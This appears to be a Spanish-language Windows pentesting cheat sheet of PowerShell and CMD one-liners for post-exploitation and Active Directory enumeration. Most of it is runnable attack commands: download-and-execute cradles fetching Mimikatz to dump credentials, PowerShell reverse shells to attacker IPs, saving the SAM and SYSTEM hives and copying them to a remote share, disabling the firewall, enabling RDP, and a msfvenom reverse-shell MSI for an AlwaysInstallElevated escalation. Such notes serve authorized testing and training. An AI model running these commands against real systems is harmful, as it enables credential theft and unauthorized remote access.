# iniciar powershell con permisos para correr scripts
powershell.exe -nop -exec bypass

# importar modulos
Import-Module PowerUp.ps1

# oneLiner para correr un script
C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”

# oneLiner para hacer un ping sweep
1..15 | %{echo "10.0.0.$_"; ping -n2 10.0.0.$_ | Select-String ttl}

# oneLiner para hacer un escaneo de puertos via sockets tcp
1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.0.$_")) "Puerto Abierto: $_"} 2>$null

# Descargar + ejecutar sin tocar el disco
C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.41.181:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.41.181 -Port 4444"

# Descargas via CLI en windows
powershell.exe -c "Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'"
IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/powerup.ps1')
C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/rev.ps1')
powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
certutil.exe -f -urlcache -split http://ip/file file

# copiar archivos via compartida
copy \\IP\SHARE\FILE FILE
c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe

# Firewall rules en Windows
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=out localport=PORT action=allow
netsh advfirewall firewall set allprofiles state off
netsh advfirewall firewall delete rule name=NOMBRE_REGLA

# Activar RDP via CLI
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# SAM Crack 
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup
-
copy sam.backup \\IP\smbfolder\sam
copy system.backup \\IP\smbfolder\system
-
pwdump system sam --> lista los hashes de las contraseñas

----
# AlwaysInstallElevated exploit
# consultar el estado 
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# payload
msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi
----

# CMD
tasklist
taskkill /pid 1234
taskkill /F /IM notepad.exe
whoami /priv

Start-Process notepad.exe
Get-Process -Name notepad
Get-Process | Export-Csv running_processes.csv
Get-Content ips.txt # similar a cat ips.txt
Copy-Item ips.txt backup_ips.txt
Move-Item ips.txt backup_ips.txt
Get-FileHash -Algorithm MD5 ips.txt
Get-HotFix | Format-list | findstr 'InstalledOn' 
Get-HotFix | Format-list | findstr /C:'HotFixID' /C:'InstalledOn' # multiples busquedas
(Get-NetUser).name # filtra solo el criterio "name"

systeminfo
net localgroup Administrators --> lista los miembros del grupo Administrators
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
----
# https://gist.github.com/HarmJ0y/3328d954607d71362e3c
# PowerView
Import-Module powerview.ps1	

# Lista los usuarios y filtra por nombre o descripción
(Get-NetUser).description
(Get-NetUser).name
	
# usuarios deshabilitados
Get-NetUser -Filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"

# muestra los miembros de cada grupo
Get-NetGroupMember 'Domain admins'

# Muestra recursos compartidos con permisos de lectura
Find-DomainShare -CheckShareAccess

# Enumera GPOs
Get-NetGPO

